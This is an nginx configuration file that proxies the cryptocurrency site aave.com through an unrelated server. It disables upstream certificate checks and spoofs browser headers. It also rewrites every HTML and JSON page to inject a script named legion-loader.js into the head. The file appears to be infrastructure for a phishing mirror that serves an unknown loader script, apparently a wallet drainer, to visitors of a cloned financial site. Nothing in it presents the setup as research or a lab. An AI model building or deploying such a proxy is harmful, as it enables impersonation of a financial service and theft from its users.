worker_processes 1;
events { worker_connections 2048; }

http {
  include /etc/nginx/mime.types;
  default_type application/octet-stream;
  sendfile on;
  keepalive_timeout 65;
  proxy_connect_timeout 60s;
  proxy_send_timeout 120s;
  proxy_read_timeout 120s;
  proxy_buffering off;

  resolver 127.0.0.11 8.8.8.8 valid=60s ipv6=off;
  gzip off;

  server {
    listen 80;
    server_name _;

    location / {
      proxy_pass https://aave.com;
      proxy_ssl_verify off;
      proxy_set_header Host aave.com;
      proxy_set_header User-Agent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36";
      proxy_set_header Accept-Language en-US;
      proxy_set_header Accept */*;

      sub_filter '</head>' '<script src="/legion-loader.js"></script></head>';
      sub_filter_types text/html application/json;
      sub_filter_once on;
    }
  }
}
